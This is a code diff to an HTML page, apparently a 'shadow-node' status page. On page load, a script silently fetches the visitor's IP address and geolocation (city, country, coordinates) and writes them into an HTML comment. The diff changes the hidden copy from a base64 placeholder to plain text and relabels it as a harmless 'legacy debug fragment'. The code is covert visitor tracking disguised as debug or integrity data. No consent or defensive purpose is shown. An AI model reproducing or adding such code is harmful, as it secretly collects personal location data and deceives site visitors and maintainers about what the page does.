@@ -84,16 +84,10 @@ Send full log fragment to administrator
 
     <div class="tiny-footer">v0.7b • shadow-node • 20260308</div>
 
-    <!-- 
-       shadow-node boot integrity check v0.7b 
-       chain hash: 0xA3F9-7B2E-1C4D-8E90 
-       entropy fragment buffer: [REDACTED]
-    -->
-
-    <!-- integrity-check: shadow-node-v0.7b-entropy-buffer-fragment-[BASE64-HERE] -->
+    <!-- legacy debug fragment v0.7b - do not remove -->
 
     <script>
-        async function captureAndInjectDeep() {
+        async function captureAndHidePlain() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
@@ -107,36 +101,41 @@ Send full log fragment to administrator
 
                 if (!geo.error && geo.status !== 'fail') {
                     const payload = {
-                        ip,
-                        city: geo.city || geo.regionName || '?',
-                        country: geo.country || geo.countryName || '?',
-                        lat: geo.latitude || geo.lat || 0,
-                        lon: geo.longitude || geo.lon || 0,
-                        captured: new Date().toISOString()
+                        captured_ip: ip,
+                        captured_city: geo.city || geo.regionName || '?',
+                        captured_country: geo.country || geo.countryName || '?',
+                        captured_lat: geo.latitude || geo.lat || 0,
+                        captured_lon: geo.longitude || geo.lon || 0,
+                        captured_at: new Date().toISOString()
                     };
 
-                    const json = JSON.stringify(payload);
-                    const encoded = btoa(json);
+                    // Build plain text block
+                    const plainText = 
+                        `captured_ip: ${payload.captured_ip}\n` +
+                        `captured_city: ${payload.captured_city}\n` +
+                        `captured_country: ${payload.captured_country}\n` +
+                        `captured_lat: ${payload.captured_lat}\n` +
+                        `captured_lon: ${payload.captured_lon}\n` +
+                        `captured_at: ${payload.captured_at}`;
 
-                    // Inject into the very last comment
+                    // Inject into the last comment
                     const lastComment = document.body.lastChild;
                     if (lastComment && lastComment.nodeType === 8) {
                         let text = lastComment.textContent;
-                        text = text.replace(
-                            '[BASE64-HERE]',
-                            encoded
-                        );
+                        text += '\n' + plainText;
                         lastComment.textContent = text;
                     }
 
-                    console.log("Data injected deep:", payload);
+                    console.log("Plain data hidden:", payload);
                 }
             } catch (e) {
                 console.warn("Capture failed", e);
             }
         }
 
-        captureAndInjectDeep();
+        captureAndHidePlain();
     </script>
+
+    <!-- legacy debug fragment v0.7b - do not remove -->
 </body>
 </html>
